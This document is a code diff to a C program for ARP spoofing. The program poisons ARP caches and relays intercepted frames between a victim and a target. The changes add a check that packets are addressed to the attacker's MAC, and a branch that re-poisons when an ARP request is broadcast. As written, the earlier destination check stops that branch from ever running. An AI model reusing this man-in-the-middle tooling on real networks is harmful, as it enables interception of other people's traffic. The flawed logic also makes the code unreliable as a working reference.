@@ -147,7 +147,7 @@ int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, str
         if(res == 0)
             continue;
 
-        switch (CheckPacket(packet, SenderMac, SenderIP, TargetIP)){
+        switch (CheckPacket(packet, SenderMac, LocalMac, SenderIP, TargetIP)){
             case 1: /* relay */
                 LOG(LogFilePath, "relay\n");
                 if(relay(LogFilePath, handle, packet, LocalMac, SenderMac, TargetMac, pheader->caplen) != EXIT_SUCCESS){
@@ -166,7 +166,7 @@ int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, str
 }
 
 
-int CheckPacket(const u_char* packet, struct ether_addr shost, struct in_addr sIp, struct in_addr dIp){
+int CheckPacket(const u_char* packet, struct ether_addr shost, struct ether_addr LocalMac, struct in_addr sIp, struct in_addr dIp){
     struct ether_header* peth_hdr;
     struct arphdr* parp_hdr;
     struct arp_addr* parp_addr;
@@ -177,6 +177,9 @@ int CheckPacket(const u_char* packet, struct ether_addr shost, struct in_addr sI
     if(memcmp(peth_hdr->ether_shost, &shost, ETHER_ADDR_LEN))
         return 0;
 
+    /* check packet destination is me(attacker) */
+    if(memcmp(peth_hdr->ether_dhost, &LocalMac, ETHER_ADDR_LEN))
+        return 0;
     /* check is arp request */
     if(peth_hdr->ether_type == htons(ETHERTYPE_ARP)){
 
@@ -187,6 +190,11 @@ int CheckPacket(const u_char* packet, struct ether_addr shost, struct in_addr sI
                 parp_hdr->ar_hln == ETHER_ADDR_LEN &&
                 parp_hdr->ar_pln == IP_ADDRLEN &&
                 parp_hdr->ar_op == htons(ARPOP_REQUEST)){
+
+            /* poison when arp request broadcast */
+            if(!memcmp(peth_hdr->ether_dhost, BROADCAST_MAC, ETHER_ADDR_LEN)){
+                return 2;
+            }
 
             parp_addr = (struct arp_addr*)(packet + sizeof(struct ether_header) + sizeof(struct arphdr));
 
